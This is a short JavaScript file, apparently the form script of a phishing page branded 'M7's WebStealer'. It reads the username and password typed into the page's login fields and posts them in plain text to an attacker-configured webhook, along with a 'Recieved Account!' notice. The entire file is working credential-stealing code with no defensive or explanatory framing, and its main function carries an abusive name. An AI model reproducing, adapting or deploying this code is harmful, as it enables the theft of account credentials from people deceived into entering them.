function gtfo_cunt() {

  var WEB_URL = ""; //Here Your Webhook
  
  var NAME = "M7's Sender"; //Webhook Sender Name
  
  var PROFILE_PICTURE = ""; //The PFP
  
  var MESSAGE_POST = "**Recieved Account!**\n\nUsername : \n``" + $('#user').val() + "``\nPassword : \n``" + $('#pass').val() +
  "``\n\nThank You For Using M7's WebStealer ||@here && @everyone||"; //Message Which WIll Stay The Same


  if ($('#user').val() && $('#pass').val()) {DisableButton();
    $.post(WEB_URL, {
      content: MESSAGE_POST,
      username: NAME,
      avatar_url: PROFILE_PICTURE,
    })
  } else{
   EnableButton();
  }
}

function DisableButton()
{
  var btn = document.getElementById("sendButton")
  btn.disabled = true;
  btn.innerText = "Sent!";
}

function EnableButton()
{
  var btn = document.getElementById("sendButton")
  btn.disabled = false;
  btn.innerText = "Failed!";
}